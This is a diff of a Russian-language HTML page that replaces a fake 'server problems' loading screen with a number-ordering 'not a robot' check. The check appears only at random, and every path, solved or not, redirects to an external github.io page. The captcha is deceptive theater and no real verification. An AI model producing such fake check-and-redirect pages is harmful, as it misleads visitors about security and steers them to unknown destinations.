@@ -47,23 +47,136 @@
             font-size: 14px;
             color: #888;
             font-weight: 300;
-            margin-bottom: 10px;
-            min-height: 20px;
+        }
+        
+        .captcha-container {
+            display: none;
+            background: #111;
+            padding: 30px 25px;
+            border-radius: 12px;
+            border: 1px solid #222;
+            margin: 0 auto;
+        }
+        
+        .captcha-title {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #fff;
+            font-weight: 400;
+        }
+        
+        .puzzle-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .puzzle-row {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .puzzle-piece {
+            width: 50px;
+            height: 50px;
+            background: #222;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 500;
+            color: #fff;
+            transition: all 0.2s ease;
+            border: 1px solid #333;
+        }
+        
+        .puzzle-piece:active {
+            background: #333;
+            transform: scale(0.95);
+        }
+        
+        .puzzle-slot {
+            width: 50px;
+            height: 50px;
+            background: #000;
+            border: 1px dashed #333;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #444;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        
+        .puzzle-slot.filled {
+            background: #222;
+            border: 1px solid #444;
+            color: #fff;
+        }
+        
+        .captcha-button {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 20px;
+        }
+        
+        .captcha-button:active {
+            background: #ccc;
+        }
+        
+        .captcha-button:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
         }
         
         .error-message {
             color: #ff4444;
-            font-size: 16px;
-            font-weight: 500;
-            margin: 20px 0;
-            display: none;
-        }
-        
-        .ip-info {
-            font-size: 12px;
-            color: #888;
+            font-size: 13px;
             margin-top: 15px;
             display: none;
+            font-weight: 400;
+        }
+        
+        .progress-container {
+            display: none;
+            margin-top: 30px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 2px;
+            background: #222;
+            border-radius: 1px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: #fff;
+            transition: width 0.3s ease;
+        }
+        
+        .success-message {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 400;
         }
         
         @keyframes spin {
@@ -85,55 +198,160 @@
     <div class="container">
         <div class="loader">
             <div class="circle" id="spinner"></div>
-            <div class="status" id="statusText">Подключение к серверу...</div>
-            <div class="error-message" id="errorMessage">Проблемы с серверами</div>
-            <div class="ip-info" id="ipInfo">Ваш IP: загрузка...</div>
+            <div class="status" id="statusText">Подождите...</div>
+        </div>
+        
+        <div class="captcha-container" id="captchaContainer">
+            <div class="captcha-title">Подтвердите действие</div>
+            
+            <div class="puzzle-container">
+                <div class="puzzle-row">
+                    <div class="puzzle-piece" data-value="3">3</div>
+                    <div class="puzzle-piece" data-value="1">1</div>
+                    <div class="puzzle-piece" data-value="2">2</div>
+                </div>
+                
+                <div class="puzzle-row">
+                    <div class="puzzle-slot" data-correct="1">—</div>
+                    <div class="puzzle-slot" data-correct="2">—</div>
+                    <div class="puzzle-slot" data-correct="3">—</div>
+                </div>
+            </div>
+            
+            <button class="captcha-button" id="captchaButton" disabled>Продолжить</button>
+            <div class="error-message" id="errorMessage">Неверный порядок</div>
+        </div>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="success-message" id="successMessage">Перенаправляем...</div>
         </div>
     </div>
 
     <script>
+        const captchaContainer = document.getElementById('captchaContainer');
         const statusText = document.getElementById('statusText');
+        const successMessage = document.getElementById('successMessage');
+        const spinner = document.getElementById('spinner');
+        const captchaButton = document.getElementById('captchaButton');
         const errorMessage = document.getElementById('errorMessage');
-        const ipInfo = document.getElementById('ipInfo');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        
+        let captchaPassed = false;
+        let currentOrder = [];
+        let correctOrder = ['1', '2', '3'];
 
-        // Простой список статусов
-        const loadingStatuses = [
-            "Подключение к серверу...",
-            "Загрузка данных...",
-            "Проверка соединения...",
-            "Обработка запроса..."
-        ];
+        // Функция для определения, показывать ли капчу (50% шанс)
+        function shouldShowCaptcha() {
+            return Math.random() < 0.5; // 50% вероятность
+        }
 
-        // Меняем статусы каждые 5 секунд
-        let statusIndex = 0;
-        const statusInterval = setInterval(() => {
-            statusIndex = (statusIndex + 1) % loadingStatuses.length;
-            statusText.textContent = loadingStatuses[statusIndex];
-        }, 5000);
+        function shufflePuzzle() {
+            const pieces = document.querySelectorAll('.puzzle-piece');
+            const container = document.querySelector('.puzzle-row:first-child');
+            const shuffled = Array.from(pieces).sort(() => Math.random() - 0.5);
+            
+            container.innerHTML = '';
+            shuffled.forEach(piece => container.appendChild(piece));
+        }
 
-        // Через 30 секунд показываем ошибку
+        function resetCaptcha() {
+            currentOrder = [];
+            
+            document.querySelectorAll('.puzzle-slot').forEach(slot => {
+                slot.classList.remove('filled');
+                slot.innerHTML = '—';
+            });
+            
+            document.querySelectorAll('.puzzle-piece').forEach(piece => {
+                piece.style.display = 'flex';
+            });
+            
+            captchaButton.disabled = true;
+            errorMessage.style.display = 'none';
+            shufflePuzzle();
+        }
+
+        function startRedirect() {
+            captchaPassed = true;
+            statusText.textContent = "Завершаем...";
+            progressContainer.style.display = 'block';
+            
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                progressFill.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    successMessage.textContent = "Перенаправляем...";
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://tqqqka.github.io/cvapta-choise/";
+                    }, 500);
+                }
+            }, 20);
+        }
+
+        // Основная логика загрузки
         setTimeout(() => {
-            clearInterval(statusInterval);
-            
-            // Показываем сообщение об ошибке
-            errorMessage.style.display = 'block';
-            errorMessage.classList.add('fade-in');
-            
-            // Получаем и показываем IP
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    ipInfo.textContent = `Ваш IP: ${data.ip}`;
-                })
-                .catch(() => {
-                    ipInfo.textContent = 'Ваш IP: недоступен';
-                });
-            
-            // Показываем IP информацию
-            ipInfo.style.display = 'block';
-            ipInfo.classList.add('fade-in');
-            
-        }, 30000);
+            if (shouldShowCaptcha()) {
+                // Показываем капчу (50% случаев)
+                statusText.textContent = "Подтвердите, что вы не робот";
+                captchaContainer.style.display = 'block';
+                captchaContainer.classList.add('fade-in');
+                resetCaptcha();
+            } else {
+                // Пропускаем капчу (50% случаев)
+                startRedirect();
+            }
+        }, 1500);
+
+        // Обработчики для элементов пазла
+        document.addEventListener('click', function(e) {
+            if (e.target.classList.contains('puzzle-piece')) {
+                const piece = e.target;
+                const value = piece.dataset.value;
+                
+                if (currentOrder.length >= 3) return;
+                
+                currentOrder.push(value);
+                piece.style.display = 'none';
+                
+                const targetSlot = document.querySelector(`.puzzle-slot[data-correct="${value}"]`);
+                if (targetSlot) {
+                    targetSlot.textContent = value;
+                    targetSlot.classList.add('filled');
+                    
+                    if (currentOrder.length === 3) {
+                        const isCorrect = JSON.stringify(currentOrder) === JSON.stringify(correctOrder);
+                        
+                        if (isCorrect) {
+                            captchaButton.disabled = false;
+                        } else {
+                            errorMessage.style.display = 'block';
+                            setTimeout(resetCaptcha, 1000);
+                        }
+                    }
+                }
+            }
+        });
+
+        // Обработчик кнопки капчи
+        captchaButton.addEventListener('click', function() {
+            if (captchaButton.disabled) return;
+            startRedirect();
+        });
+
+        // Фолбэк на случай если что-то пошло не так
+        setTimeout(() => {
+            if (!captchaPassed) {
+                startRedirect();
+            }
+        }, 10000);
     </script>
 </body>
 </html>
